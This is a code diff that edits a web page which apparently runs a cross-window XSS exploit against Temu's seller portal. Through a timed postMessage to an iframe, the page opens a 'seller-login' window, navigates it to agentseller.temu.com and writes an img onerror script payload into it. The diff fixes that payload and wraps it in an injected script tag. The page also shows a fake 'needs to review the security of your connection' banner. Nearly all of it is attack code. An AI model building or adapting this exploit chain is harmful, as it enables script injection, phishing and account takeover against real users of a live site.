@@ -544,7 +544,7 @@
         // 3. Add to body
         document.body.appendChild(iframe);
 
-        const code = `PulKyKYhCMcd71OslT5819ba2f63828165965157cdd5a664fc72e6a49e5aa52442f2bad7cf0`;
+        const code = `pyWZzN9TWZ9wjbxDG6I019ba3086be7165965157cddbe651c92aebc4b86b8a4f078253b6ec4`;
 
 
         setTimeout(() => {
@@ -568,9 +568,13 @@
         setTimeout(() => {
           iframe.contentWindow.postMessage(
            ` 
+           document.write(\`
+          <script>
           hamid = window.open('', 'seller-login');
           hamid.window.location = 'https://agentseller.temu.com/';
-          hamid.document.write("<img src=x onerror=alert()'))>")
+          hamid.document.write("<img src=x onerror=alert()>")
+          <\/script>
+          \`)
         `,'*')}, 9000)
       </script>
       <div id="message" class="core-msg spacer spacer-top">temu.com needs to review the security of your connection
